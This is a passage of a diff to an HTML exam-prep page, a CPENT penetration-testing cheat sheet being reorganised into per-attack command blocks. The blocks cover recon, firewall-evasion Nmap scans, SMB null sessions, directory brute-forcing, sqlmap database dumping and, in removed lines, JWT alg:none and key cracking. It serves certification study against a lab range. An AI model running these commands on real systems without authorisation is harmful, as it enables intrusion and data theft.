@@ -11,8 +11,8 @@
 </script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CPENT Cheat Sheet: The 24-Hour Exam, Mapped | Sarath G</title>
-<meta name="description" content="A practical CPENT AI cheat sheet from a CPENT + LPT holder: exam format and scoring, the 14 modules, a 24-hour game plan, and command references for recon, network, web, AD, Linux, pivoting, binary exploitation, IoT and OT.">
+<title>CPENT Cheat Sheet: Attack-by-Attack Command Reference | Sarath G</title>
+<meta name="description" content="An attack-indexed CPENT AI cheat sheet from a CPENT + LPT holder: the command for each attack, by range. Kerberoasting, AS-REP roasting, lateral movement, pivoting, JWT attacks, binary exploitation, firmware and OT, plus exam format, the 14 modules and a 24-hour plan.">
 <link rel="canonical" href="https://sarathg.me/cpent-cheatsheet">
 <meta name="author" content="Sarath G">
 <script type="application/ld+json">
@@ -21,13 +21,13 @@
   "@graph": [
     {
       "@type": "TechArticle",
-      "headline": "CPENT Cheat Sheet: The 24-Hour Exam, Mapped",
-      "description": "A field cheat sheet for the EC-Council CPENT AI exam: format and scoring, the 14 modules, a 24-hour time plan, and command references across the full pentest kill chain.",
+      "headline": "CPENT Cheat Sheet: Attack-by-Attack Command Reference",
+      "description": "An attack-indexed field cheat sheet for the EC-Council CPENT AI exam: the command for each attack, by range, plus format, the 14 modules and a 24-hour plan.",
       "image": "https://sarathg.me/assets/og/cpent-cheatsheet.png",
       "url": "https://sarathg.me/cpent-cheatsheet",
       "mainEntityOfPage": "https://sarathg.me/cpent-cheatsheet",
       "datePublished": "2026-09-09",
-      "dateModified": "2026-09-09",
+      "dateModified": "2026-09-10",
       "author": {
         "@id": "https://sarathg.me/#sarath"
       },
@@ -115,7 +115,7 @@
           "name": "Do I need to know exploit development to pass CPENT?",
           "acceptedAnswer": {
             "@type": "Answer",
-            "text": "You need working competence, not research-grade skill. The binary module expects you to find a stack buffer overflow, calculate the offset, deal with bad characters, redirect execution to a JMP ESP and land a msfvenom payload, on both 32 and 64-bit targets. Reverse engineering and fuzzing set that up. You will not be asked to write a novel heap exploit, but you must be fluent with the classic stack overflow workflow."
+            "text": "You need working competence, not research-grade skill. The binary module expects you to find a stack buffer overflow, calculate the offset, deal with bad characters, redirect execution to a JMP ESP (or JMP RSP on 64-bit) and land a msfvenom payload, on both 32 and 64-bit targets. Reverse engineering and fuzzing set that up. You will not be asked to write a novel heap exploit, but you must be fluent with the classic stack overflow workflow."
           }
         }
       ]
@@ -131,16 +131,16 @@
 }
 </script>
 <meta property="og:type" content="article" />
-<meta property="og:title" content="CPENT Cheat Sheet: The 24-Hour Exam, Mapped | Sarath G" />
-<meta property="og:description" content="A practical CPENT AI cheat sheet from a CPENT + LPT holder: exam format and scoring, the 14 modules, a 24-hour game plan, and command references across the full pentest kill chain." />
+<meta property="og:title" content="CPENT Cheat Sheet: Attack-by-Attack Command Reference | Sarath G" />
+<meta property="og:description" content="An attack-indexed CPENT AI cheat sheet: the command for each attack, by range. Kerberoasting, AS-REP roasting, lateral movement, pivoting, JWT attacks, binaries, firmware and OT." />
 <meta property="og:url" content="https://sarathg.me/cpent-cheatsheet" />
 <meta property="og:image" content="https://sarathg.me/assets/og/cpent-cheatsheet.png" />
 <meta property="og:image:width" content="1200" />
 <meta property="og:image:height" content="630" />
 <meta property="og:image:alt" content="CPENT Cheat Sheet | Sarath G" />
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:title" content="CPENT Cheat Sheet: The 24-Hour Exam, Mapped | Sarath G" />
-<meta name="twitter:description" content="Exam format and scoring, the 14 CPENT AI modules, a 24-hour game plan, and command references for recon, network, web, AD, Linux, pivoting, binaries, IoT and OT." />
+<meta name="twitter:title" content="CPENT Cheat Sheet: Attack-by-Attack Command Reference | Sarath G" />
+<meta name="twitter:description" content="The command for each CPENT attack, by range: Kerberoasting, AS-REP roasting, lateral movement, pivoting, JWT attacks, binary exploitation, firmware and OT." />
 <meta name="twitter:image" content="https://sarathg.me/assets/og/cpent-cheatsheet.png" />
 <link rel="stylesheet" href="/assets/fonts/gf/fraunces-ibm-plex-mono-plus-jakarta-sans-7a6348.css">
 <style>
@@ -162,11 +162,12 @@ body { font-family:var(--sans); background:var(--bg); color:var(--text); line-he
 .wrap { max-width:820px; margin:0 auto; padding:0 28px; }
 
 /* HERO */
-.hero { padding:88px 0 46px; border-bottom:1px solid var(--hair); }
+.hero { padding:88px 0 44px; border-bottom:1px solid var(--hair); }
 .hero .lede { font-family:var(--mono); font-size:12.5px; letter-spacing:.02em; color:var(--accent); margin-bottom:26px; }
 h1 { font-family:var(--serif); font-size:clamp(36px,5.4vw,54px); font-weight:600; line-height:1.1; letter-spacing:-.02em; margin-bottom:22px; }
 .hero-desc { font-size:18px; color:var(--text2); max-width:60ch; line-height:1.66; }
-.hero-meta { margin-top:30px; font-size:14.5px; color:var(--text3); display:flex; flex-wrap:wrap; align-items:baseline; gap:8px 14px; }
+.hero-xref { margin-top:20px; font-size:15px; color:var(--text2); max-width:60ch; }
+.hero-meta { margin-top:26px; font-size:14.5px; color:var(--text3); display:flex; flex-wrap:wrap; align-items:baseline; gap:8px 14px; }
 .hero-meta b { color:var(--text); font-weight:600; }
 .hero-meta .sep { color:var(--border); }
 
@@ -241,14 +242,25 @@ tr:last-child td { border-bottom:none; }
 td:first-child { color:var(--text); font-weight:500; white-space:nowrap; }
 td .mono, th.mono, td.mono { font-family:var(--mono); font-size:13px; color:var(--accent); font-weight:400; }
 
-/* CODE */
+/* ATTACK ENTRY */
+.atk { padding:22px 0; border-top:1px solid var(--hair); }
+.atk:first-of-type { border-top:none; padding-top:6px; }
+.atk-name { font-size:16.5px; font-weight:600; color:var(--text); display:flex; align-items:baseline; gap:11px; letter-spacing:-.01em; }
+.atk-name::before { content:''; width:6px; height:6px; border-radius:50%; background:var(--accent); flex:none; transform:translateY(-2px); }
+.atk-note { font-size:14.5px; color:var(--text2); margin:6px 0 0 17px; max-width:66ch; line-height:1.6; }
+.atk-note code { font-size:12.5px; }
+
+/* CODE (labelled block) + CMD (bare block under an attack) */
 .code { margin:20px 0; border:1px solid var(--border); border-radius:12px; overflow:hidden; background:var(--code-bg); }
 .code-top { display:flex; align-items:center; justify-content:space-between; padding:10px 16px; border-bottom:1px solid rgba(255,255,255,.05); }
 .code-label { font-family:var(--mono); font-size:11px; letter-spacing:.06em; color:var(--code-dim); }
+.cmd { position:relative; margin:12px 0 0 17px; border:1px solid var(--border); border-radius:10px; background:var(--code-bg); }
+.cmd pre { padding:15px 48px 15px 16px; }
 .copy { font-family:var(--mono); font-size:11px; color:var(--code-dim); background:none; border:1px solid transparent; padding:3px 8px; border-radius:6px; cursor:pointer; transition:color .15s,background .15s; }
-.copy:hover { color:var(--code-text); background:rgba(255,255,255,.05); }
+.copy:hover { color:var(--code-text); background:rgba(255,255,255,.06); }
 .copy.ok { color:var(--accent); }
-pre { font-family:var(--mono); font-size:13px; line-height:1.85; padding:18px 18px; overflow-x:auto; color:var(--code-text); }
+.cmd .copy { position:absolute; top:9px; right:9px; background:rgba(255,255,255,.04); }
+pre { font-family:var(--mono); font-size:13px; line-height:1.9; padding:18px; overflow-x:auto; color:var(--code-text); }
 .cm { color:var(--code-dim); }
 .pr { color:var(--code-accent); }
 code { font-family:var(--mono); font-size:13.5px; background:var(--surface2); color:var(--text); padding:1px 6px; border-radius:5px; }
@@ -269,7 +281,8 @@ code { font-family:var(--mono); font-size:13.5px; background:var(--surface2); co
   .wrap{padding:0 20px;} .toc-inner{padding:0 20px;}
   .mods{grid-template-columns:1fr;} .related ul{grid-template-columns:1fr;}
   .spec-row{grid-template-columns:1fr; gap:5px;}
-  h2{font-size:25px;} .hero{padding:64px 0 40px;}
+  h2{font-size:25px;} .hero{padding:64px 0 38px;}
+  .cmd{margin-left:0;} .atk-note{margin-left:17px;}
 }
 </style>
 <style id="sg-theme">
@@ -284,6 +297,7 @@ html.light{
 html.light .toc{background:rgba(250,249,247,.92);}
 html.light code{background:#f1efeb;color:#1a1c21;}
 html.light .copy:hover{background:rgba(255,255,255,.08);}
+html.light .cmd .copy{background:rgba(255,255,255,.06);}
 </style>
 <!-- Microsoft Clarity -->
 <script type="text/javascript">
@@ -301,8 +315,9 @@ html.light .copy:hover{background:rgba(255,255,255,.08);}
 <header class="hero">
   <div class="wrap">
     <p class="lede">CPENT / LPT field reference</p>
-    <h1>CPENT cheat sheet: the 24-hour exam, mapped</h1>
-    <p class="hero-desc">The EC-Council CPENT AI exam is 24 hours on a live cyber range, chained end to end. This is the reference to keep open on a second screen: the format and scoring, the 14 modules, a time plan that survives contact with the range, and the commands that matter, from first Nmap to final report.</p>
+    <h1>CPENT cheat sheet: the command for each attack</h1>
+    <p class="hero-desc">The EC-Council CPENT AI exam is 24 hours on a live cyber range. This is the command companion to keep open on a second screen: pick your range, find the attack, copy the command. Kerberoasting, AS-REP roasting, lateral movement, pivoting, JWT attacks, binary exploitation, firmware and OT.</p>
+    <p class="hero-xref">New to CPENT, or want the how and why first? Read the full prep guide, <a class="inl" href="/blog/how-to-pass-cpent.html">How to pass CPENT</a>. This page is its command companion; the two follow the same ranges and tools.</p>
     <p class="hero-meta">
       <b>Sarath G</b> <span class="sep">/</span> CPENT and LPT Master <span class="sep">/</span> 9+ years in offensive security and training
     </p>
@@ -323,17 +338,18 @@ html.light .copy:hover{background:rgba(255,255,255,.08);}
     <a href="#s10">Pivoting</a>
     <a href="#s11">Binaries</a>
     <a href="#s12">IoT &amp; OT</a>
-    <a href="#s13">Report</a>
-    <a href="#s14">FAQ</a>
+    <a href="#s13">Cracking</a>
+    <a href="#s14">Report</a>
+    <a href="#s15">FAQ</a>
   </div>
 </nav>
 
 <div class="wrap">
 
-<!-- 01 -->
+<!-- 01 EXAM -->
 <section class="sec" id="s1">
   <div class="sec-h"><span class="n">01</span><h2>The exam at a glance</h2></div>
-  <p class="lead-in">CPENT is not a multiple-choice test. It is a fully practical exam on a live enterprise range, remote-proctored, and chained: footholds unlock networks you could not previously see. You may use your own notes and tools, which is exactly why a cheat sheet earns its place. Against a 24-hour clock, recall speed is a score.</p>
+  <p class="lead-in">A fully practical exam on a live enterprise range, remote-proctored and chained: footholds unlock networks you could not previously see. You may use your own notes and tools, which is why this reference earns its place. Against a 24-hour clock, recall speed is a score.</p>
   <div class="spec">
     <div class="spec-row"><div class="k">Format</div><div class="v">Live cyber range <small>&mdash; 100% practical, remote-proctored</small></div></div>
     <div class="spec-row"><div class="k">Duration</div><div class="v">24 hours <small>&mdash; one session, or two of 12 hours</small></div></div>
@@ -342,17 +358,13 @@ html.light .copy:hover{background:rgba(255,255,255,.08);}
     <div class="spec-row"><div class="k">Report</div><div class="v">Within 7 days <small>&mdash; submitted after the final session, and scored</small></div></div>
     <div class="spec-row"><div class="k">Modules</div><div class="v">14 <small>&mdash; recon to report, the full kill chain</small></div></div>
   </div>
-  <p><strong>&ldquo;CPENT AI&rdquo; is the current version.</strong> Same 24-hour range and the same LPT Master pathway, plus AI-assisted techniques mapped across the phases: AI for reconnaissance, vulnerability analysis and exploit suggestion, Active Directory enumeration and API recon. The skills the range grades are unchanged. Treat AI as an accelerator on top of everything below, not a replacement for it.</p>
-  <div class="callout key">
-    <div class="cl-label">The report counts</div>
-    <p>Rooting a box you cannot document earns you nothing. Screenshot every step, flag and proof as you go, with the command visible in frame. A candidate who reaches 90% on the range but writes a weak report can still drop below the LPT line. <a class="inl" href="#s13">Report writing is Section 13.</a></p>
-  </div>
+  <p>How to read this page: each range below is a set of named attacks, each with the command to run. When you are in the Active Directory range and need to Kerberoast, jump to <a class="inl" href="#s8">AD &amp; Windows</a> and copy the line. The commands assume Kali; install the few extras (NetExec, chisel, pwntools, firmwalker) the week before, not on exam morning.</p>
 </section>
 
-<!-- 02 -->
+<!-- 02 MODULES -->
 <section class="sec" id="s2">
   <div class="sec-h"><span class="n">02</span><h2>The 14 CPENT AI modules</h2></div>
-  <p>The official curriculum, in order. This cheat sheet groups them into the sections that follow, but keep the list in mind: it is the map of what the range can throw at you.</p>
+  <p>The official curriculum, in order. The command sections below map onto these.</p>
   <ol class="mods">
     <li><span class="mn">01</span><span class="mt">Introduction to Penetration Testing &amp; Methodologies<span>Frameworks, PTES, scoping mindset</span></span></li>
     <li><span class="mn">02</span><span class="mt">Penetration Testing Scoping &amp; Engagement<span>Rules of engagement, legal, scope</span></span></li>
@@ -369,16 +381,15 @@ html.light .copy:hover{background:rgba(255,255,255,.08);}
     <li><span class="mn">13</span><span class="mt">IoT Penetration Testing<span>Firmware, protocols, hardware</span></span></li>
     <li><span class="mn">14</span><span class="mt">Report Writing &amp; Post-Testing Actions<span>Findings, PoC, remediation</span></span></li>
   </ol>
-  <p>Operational technology, wireless and cloud work are folded into the modules above and the range challenges rather than listed as standalone chapters. OT / SCADA is an advanced range skill, covered in <a class="inl" href="#s12">Section 12</a>. Do not assume a topic is out of scope just because it is not a numbered module title.</p>
 </section>
 
-<!-- 03 -->
+<!-- 03 H4H -->
 <section class="sec" id="s3">
   <div class="sec-h"><span class="n">03</span><h2>Hackers 4 Humanity 2026</h2></div>
-  <p>If you are looking at CPENT right now, this is often why. EC-Council&rsquo;s <strong>Hackers 4 Humanity</strong> invites experienced penetration testers to sit a fully sponsored CPENT AI exam. You do not donate money. You donate skill.</p>
+  <p>EC-Council&rsquo;s <strong>Hackers 4 Humanity</strong> invites experienced penetration testers to sit a fully sponsored CPENT AI exam. You do not donate money; you donate skill.</p>
   <div class="panel">
     <h3>Pass a sponsored exam, fund someone else&rsquo;s start</h3>
-    <p>For every professional who passes, EC-Council commits <strong>$1,000 of cybersecurity training</strong> to underprivileged learners through vetted non-profit partners. Score 90% or more and you are named one of the <strong>1,000 Great Pen Testers of 2026</strong>, recognised on stage at Hacker Halted and streamed globally.</p>
+    <p>For every professional who passes, EC-Council commits <strong>$1,000 of cybersecurity training</strong> to underprivileged learners through vetted non-profit partners. Score 90% or more and you are named one of the <strong>1,000 Great Pen Testers of 2026</strong>, recognised on stage at Hacker Halted.</p>
     <div class="figs">
       <div class="fig"><div class="num">1,000</div><div class="lbl">sponsored exams</div></div>
       <div class="fig"><div class="num">$1,000</div><div class="lbl">donated per pass</div></div>
@@ -386,314 +397,465 @@ html.light .copy:hover{background:rgba(255,255,255,.08);}
       <div class="fig"><div class="num">90%+</div><div class="lbl">= Hall of Fame</div></div>
     </div>
   </div>
-  <div class="tbl-wrap"><table>
-    <thead><tr><th>Detail</th><th>What to know</th></tr></thead>
-    <tbody>
-    <tr><td>Who can apply</td><td>Active penetration testers with verifiable experience, or CEH-certified (or equivalent) with 2+ years in information security. You must not already hold CPENT AI.</td></tr>
-    <tr><td>Nomination window</td><td>Roughly May 1 to early October 2026. Self-nominate or nominate a peer through EC-Council&rsquo;s form.</td></tr>
-    <tr><td>After approval</td><td>You have about 30 days to sit the exam; late approvals finish by end of October 2026.</td></tr>
-    <tr><td>Report</td><td>Submit your penetration test report within 7 days of the final session, same as a normal attempt.</td></tr>
-    <tr><td>Recognition</td><td>90%+ scorers named among the 1,000 Great Pen Testers and inducted at Hacker Halted, late 2026.</td></tr>
-    </tbody>
-  </table></div>
   <div class="callout">
     <div class="cl-label">Verify before you rely on it</div>
-    <p>Programme dates, eligibility and partners are set by EC-Council and can change. Confirm the current terms on the official <a class="inl" href="https://www.eccouncil.org/hackers4humanity/" target="_blank" rel="noopener">Hackers 4 Humanity</a> page before nominating. This is a summary, not the terms of entry.</p>
+    <p>Dates, eligibility and partners are set by EC-Council and can change. Confirm current terms on the official <a class="inl" href="https://www.eccouncil.org/hackers4humanity/" target="_blank" rel="noopener">Hackers 4 Humanity</a> page before nominating.</p>
   </div>
 </section>
 
 <p class="part">Part II &mdash; The 24-hour game plan</p>
 
-<!-- 04 -->
+<!-- 04 PLAN -->
 <section class="sec" id="s4">
   <div class="sec-h"><span class="n">04</span><h2>A time plan that survives the range</h2></div>
-  <p>Most CPENT failures are not skill failures. They are <strong>time failures</strong>: eight hours lost in one rabbit hole, or a pivot attempted too late to reach the networks behind it. Split the clock into two 12-hour sessions if you can, sleep between them, and treat the plan below as a budget you actively defend.</p>
+  <p>Most CPENT failures are time failures, not skill failures: hours lost in one rabbit hole, or a pivot attempted too late to reach the networks behind it. Treat the plan below as a budget you actively defend.</p>
   <div class="tbl-wrap"><table>
     <thead><tr><th>Window</th><th>Focus</th><th>The discipline</th></tr></thead>
     <tbody>
-    <tr><td>0:00&ndash;1:00</td><td>Full-scope sweep</td><td>Kick off a background <code>-p-</code> scan across everything in scope before touching a single box. Never let the network sit un-enumerated while you work one host.</td></tr>
+    <tr><td>0:00&ndash;1:00</td><td>Full-scope sweep</td><td>Kick off a background <code>-p-</code> scan across everything in scope before touching a single box.</td></tr>
     <tr><td>1:00&ndash;4:00</td><td>Low-hanging fruit</td><td>Bank the easy flags: exposed web apps, default creds, obvious CVEs. Points early buy calm later.</td></tr>
-    <tr><td>4:00&ndash;7:00</td><td>Foothold &amp; pivot</td><td>Get a shell that reaches a new segment, then pivot immediately. Hidden networks hold the marks; reach them early.</td></tr>
-    <tr><td>7:00&ndash;10:00</td><td>AD / internal</td><td>Enumerate the domain, Kerberoast, chase a path to Domain Admin with BloodHound. Dense, high-value ground.</td></tr>
-    <tr><td>10:00&ndash;12:00</td><td>Checkpoint</td><td>Stop. Back up notes, write findings while fresh, snapshot progress. End session one clean.</td></tr>
-    <tr><td>12:00&ndash;18:00</td><td>Binaries &amp; hard targets</td><td>Fresh brain on the buffer overflow and reverse-engineering challenges. These reward patience, not panic.</td></tr>
-    <tr><td>18:00&ndash;22:00</td><td>Double pivot &amp; cleanup</td><td>Reach the deepest segment, collect remaining flags, re-try anything parked earlier with new access.</td></tr>
+    <tr><td>4:00&ndash;7:00</td><td>Foothold &amp; pivot</td><td>Get a shell that reaches a new segment, then pivot immediately. Hidden networks hold the marks.</td></tr>
+    <tr><td>7:00&ndash;10:00</td><td>AD / internal</td><td>Enumerate the domain, Kerberoast, chase a path to Domain Admin with BloodHound.</td></tr>
+    <tr><td>10:00&ndash;12:00</td><td>Checkpoint</td><td>Back up notes, write findings while fresh, snapshot progress. End session one clean.</td></tr>
+    <tr><td>12:00&ndash;18:00</td><td>Binaries &amp; hard targets</td><td>Fresh brain on the buffer overflow and reverse-engineering challenges.</td></tr>
+    <tr><td>18:00&ndash;22:00</td><td>Double pivot &amp; cleanup</td><td>Reach the deepest segment, collect remaining flags, retry parked targets with new access.</td></tr>
     <tr><td>22:00&ndash;24:00</td><td>Evidence lock</td><td>Confirm every claimed flag has a screenshot and a repeatable command. No proof, no points.</td></tr>
     </tbody>
   </table></div>
   <div class="callout key">
     <div class="cl-label">The 45-minute rule</div>
-    <p>If a target has not moved in 45 minutes, park it with a note and move on. The range is chained, and unrelated points are still points. You return with a clearer head and, often, new credentials or a new pivot that cracks it open.</p>
+    <p>If a target has not moved in 45 minutes, park it with a note and move on. The range is chained, and unrelated points are still points. You return with a clearer head and, often, a new credential or pivot that cracks it open.</p>
   </div>
-  <p>Keep one running log per host: IP, open ports, credentials found, exploit used, flag, and the exact command with a timestamped screenshot. Do this and your report is most of the way written by the time the range closes.</p>
 </section>
 
-<p class="part">Part III &mdash; Command references</p>
+<p class="part">Part III &mdash; Attack-by-attack commands</p>
 
-<!-- 05 -->
+<!-- 05 RECON -->
 <section class="sec" id="s5">
-  <div class="sec-h"><span class="n">05</span><h2>Recon, OSINT &amp; scoping</h2></div>
-  <p>Passive first, then active. Map the attack surface before you make noise. In a scoped exam the OSINT points are fast and cheap.</p>
-  <div class="code">
-    <div class="code-top"><span class="code-label">passive &amp; active recon</span><button class="copy" onclick="cp(this)">Copy</button></div>
-<pre><span class="cm"># Subdomains &amp; DNS</span>
-theHarvester -d target.com -b all
+  <div class="sec-h"><span class="n">05</span><h2>Recon &amp; scoping</h2></div>
+  <p>Passive first, then active. Map the attack surface before you make noise.</p>
+
+  <div class="atk">
+    <p class="atk-name">Subdomain &amp; DNS enumeration</p>
+    <p class="atk-note">Find the wider surface, then try a zone transfer, which occasionally dumps the whole namespace.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>theHarvester -d target.com -b all
 subfinder -d target.com | httpx -sc -title
-dnsrecon -d target.com -a          <span class="cm"># attempt an AXFR zone transfer</span>
-dig axfr target.com @ns1.target.com
-
-<span class="cm"># Live hosts on a scoped range</span>
-nmap -sn 10.10.10.0/24 -oA hosts   <span class="cm"># ping sweep, no port scan</span>
-fping -a -g 10.10.10.0/24 2&gt;/dev/null
-
-<span class="cm"># Attack-surface OSINT</span>
-whatweb https://target.com
-shodan host 203.0.113.10           <span class="cm"># exposed services, banners</span></pre>
+dnsrecon -d target.com -a          <span class="cm"># AXFR zone-transfer attempt</span>
+dig axfr target.com @ns1.target.com</pre></div>
   </div>
-  <p>The AI-assisted flow expects you to feed recon output into an assistant for triage: rank hosts by exploitability, summarise a large Nmap output, suggest a first exploit. Use it to prioritise, then verify by hand. The range scores the actual exploit, not the suggestion.</p>
+
+  <div class="atk">
+    <p class="atk-name">Live-host discovery on a scoped range</p>
+    <p class="atk-note">Ping sweep only. Do this before any port scan so the whole scope is mapped while you work one host.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>nmap -sn 10.10.10.0/24 -oA hosts
+fping -a -g 10.10.10.0/24 2&gt;/dev/null</pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">Attack-surface fingerprinting</p>
+    <p class="atk-note">Identify tech stacks and exposed services fast, to prioritise which host to hit first.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>whatweb https://target.com
+shodan host 203.0.113.10           <span class="cm"># exposed services, banners</span></pre></div>
+  </div>
 </section>
 
-<!-- 06 -->
+<!-- 06 NETWORK -->
 <section class="sec" id="s6">
-  <div class="sec-h"><span class="n">06</span><h2>Network, perimeter &amp; service enumeration</h2></div>
-  <p>Nmap is the workhorse. Know the full-port sweep, service and version detection, the scripting engine, and the evasion flags for perimeter devices.</p>
-  <div class="code">
-    <div class="code-top"><span class="code-label">nmap</span><button class="copy" onclick="cp(this)">Copy</button></div>
-<pre><span class="cm"># The one-two: fast full sweep, then deep on what is open</span>
-nmap -p- --min-rate 2000 -T4 10.10.10.5 -oN all-ports.txt
-nmap -sC -sV -p 22,80,445,3389 10.10.10.5 -oA deep
+  <div class="sec-h"><span class="n">06</span><h2>Network &amp; perimeter</h2></div>
+  <p>Nmap is the workhorse. Sweep, then go deep, then enumerate the service. The perimeter-evasion flags are Module 07.</p>
 
-nmap -sU --top-ports 50 10.10.10.5        <span class="cm"># UDP: SNMP, TFTP, IKE</span>
-nmap --script "vuln" -p 445 10.10.10.5    <span class="cm"># NSE vuln category</span>
-
-<span class="cm"># Perimeter / firewall evasion (module 07)</span>
-nmap -sA -p 1-1000 10.10.10.5             <span class="cm"># ACK scan: map firewall rules</span>
-nmap -f --mtu 16 10.10.10.5               <span class="cm"># fragment packets</span>
-nmap -D RND:10 10.10.10.5                 <span class="cm"># decoys</span>
-nmap -g 53 -sS 10.10.10.5                 <span class="cm"># source port 53, often trusted</span></pre>
+  <div class="atk">
+    <p class="atk-name">Full-port sweep, then deep scan</p>
+    <p class="atk-note">Fast full sweep for open ports, then service, version and default-script detection only on what answered.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>nmap -p- --min-rate 2000 -T4 10.10.10.5 -oN all-ports.txt
+nmap -sC -sV -p 22,80,445,3389 10.10.10.5 -oA deep</pre></div>
   </div>
-  <div class="code">
-    <div class="code-top"><span class="code-label">service enumeration</span><button class="copy" onclick="cp(this)">Copy</button></div>
-<pre><span class="cm"># SMB (445)</span>
-enum4linux-ng -A 10.10.10.5
+
+  <div class="atk">
+    <p class="atk-name">UDP &amp; NSE vulnerability scan</p>
+    <p class="atk-note">The UDP top ports catch SNMP, TFTP and IKE; the vuln category flags known CVEs on a service.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>nmap -sU --top-ports 50 10.10.10.5
+nmap --script "vuln" -p 445 10.10.10.5</pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">Firewall &amp; IDS evasion</p>
+    <p class="atk-note">ACK scan maps which ports are filtered; fragmentation, decoys and a trusted source port slip past simple rules.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>nmap -sA -p 1-1000 10.10.10.5       <span class="cm"># map firewall rules</span>
+nmap -f --mtu 16 10.10.10.5         <span class="cm"># fragment packets</span>
+nmap -D RND:10 10.10.10.5           <span class="cm"># decoys</span>
+nmap -g 53 -sS 10.10.10.5           <span class="cm"># source port 53, often trusted</span></pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">SMB enumeration (445)</p>
+    <p class="atk-note">Null-session share listing and a quick credential check. The single richest port on most internal ranges.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>enum4linux-ng -A 10.10.10.5
 smbclient -L //10.10.10.5/ -N          <span class="cm"># null-session share list</span>
-crackmapexec smb 10.10.10.5 -u '' -p ''
+nxc smb 10.10.10.5 -u '' -p ''         <span class="cm"># NetExec, anonymous</span></pre></div>
+  </div>
 
-<span class="cm"># LDAP (389) · SNMP (161) · NFS (2049)</span>
-ldapsearch -x -H ldap://10.10.10.5 -s base namingcontexts
+  <div class="atk">
+    <p class="atk-name">LDAP, SNMP &amp; NFS</p>
+    <p class="atk-note">The <code>public</code> SNMP string leaks users and routes; LDAP gives naming contexts; NFS shows exported mounts.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>ldapsearch -x -H ldap://10.10.10.5 -s base namingcontexts
 snmpwalk -v2c -c public 10.10.10.5
-showmount -e 10.10.10.5</pre>
+showmount -e 10.10.10.5</pre></div>
   </div>
-  <div class="tbl-wrap"><table>
-    <thead><tr><th>Port</th><th>Service</th><th>First move</th></tr></thead>
-    <tbody>
-    <tr><td class="mono">21</td><td>FTP</td><td>Anonymous login, then check writable dirs for web-root upload</td></tr>
-    <tr><td class="mono">445</td><td>SMB</td><td>Null session, share enum, EternalBlue / CVE checks, then creds</td></tr>
-    <tr><td class="mono">161</td><td>SNMP</td><td><code>public</code> community string leaks users, routes, processes</td></tr>
-    <tr><td class="mono">1433</td><td>MSSQL</td><td><code>xp_cmdshell</code>, linked servers, service-account privesc</td></tr>
-    <tr><td class="mono">3389</td><td>RDP</td><td>Once you have creds; check NLA and password reuse</td></tr>
-    </tbody>
-  </table></div>
 </section>
 
-<!-- 07 -->
+<!-- 07 WEB -->
 <section class="sec" id="s7">
-  <div class="sec-h"><span class="n">07</span><h2>Web application &amp; API / JWT</h2></div>
-  <p>Content discovery, then injection and access-control flaws. The dedicated API and JSON Web Token module means IDOR / BOLA and JWT attacks are fair game, not just classic OWASP injection.</p>
-  <div class="code">
-    <div class="code-top"><span class="code-label">web discovery &amp; injection</span><button class="copy" onclick="cp(this)">Copy</button></div>
-<pre><span class="cm"># Content &amp; vhost discovery</span>
-ffuf -u https://target/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,403
+  <div class="sec-h"><span class="n">07</span><h2>Web, API &amp; JWT</h2></div>
+  <p>Content discovery, then injection and access-control flaws. The dedicated API and JWT module means IDOR / BOLA and token attacks are in scope, not just OWASP injection.</p>
+
+  <div class="atk">
+    <p class="atk-name">Content &amp; vhost discovery</p>
+    <p class="atk-note">Brute directories and virtual hosts to find the hidden app. Filter noise by status code or response size.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>ffuf -u https://target/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,403
 ffuf -u https://target -H "Host: FUZZ.target" -w subdomains.txt -fs 0
-gobuster dir -u https://target -w raft-medium-words.txt -x php,txt
-
-<span class="cm"># Injection</span>
-sqlmap -u "https://target/item?id=1" --batch --dbs
-sqlmap -r request.txt --batch --dump    <span class="cm"># from a saved Burp request</span>
-nikto -h https://target</pre>
+gobuster dir -u https://target -w raft-medium-words.txt -x php,txt</pre></div>
   </div>
-  <div class="code">
-    <div class="code-top"><span class="code-label">API &amp; JWT attacks</span><button class="copy" onclick="cp(this)">Copy</button></div>
-<pre><span class="cm"># IDOR / BOLA: iterate object IDs across another user's context</span>
-ffuf -u https://target/api/v1/users/FUZZ/orders -w ids.txt \
-     -H "Authorization: Bearer &lt;low-priv-token&gt;" -mc 200
 
-<span class="cm"># JWT: inspect, tamper, crack</span>
-jwt_tool &lt;token&gt;                        <span class="cm"># decode header / payload</span>
-jwt_tool &lt;token&gt; -X a                    <span class="cm"># alg:none bypass</span>
-jwt_tool &lt;token&gt; -C -d wordlist.txt      <span class="cm"># brute the HS256 secret</span>
-hashcat -m 16500 jwt.txt rockyou.txt     <span class="cm"># crack the signing key</span></pre>
+  <div class="atk">
+    <p class="atk-name">SQL injection</p>
+    <p class="atk-note">Point sqlmap at a parameter, or feed it a saved Burp request for authenticated or complex endpoints.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>sqlmap -u "https://target/item?id=1" --batch --dbs
+sqlmap -r request.txt --batch --dump   <span class="cm"># from a saved Burp request</span></pre></div>
   </div>
-  <div class="callout">
-    <div class="cl-label">The three JWT wins, in order</div>
-    <ul>
-      <li><strong>alg:none</strong> &mdash; the server trusts an unsigned token.</li>
-      <li><strong>Weak HS256 secret</strong> you can crack, then forge admin claims.</li>
-      <li><strong>Algorithm confusion</strong> &mdash; sign with the public key as an HMAC secret when the server expects RS256.</li>
-    </ul>
+
+  <div class="atk">
+    <p class="atk-name">Server misconfig &amp; WordPress</p>
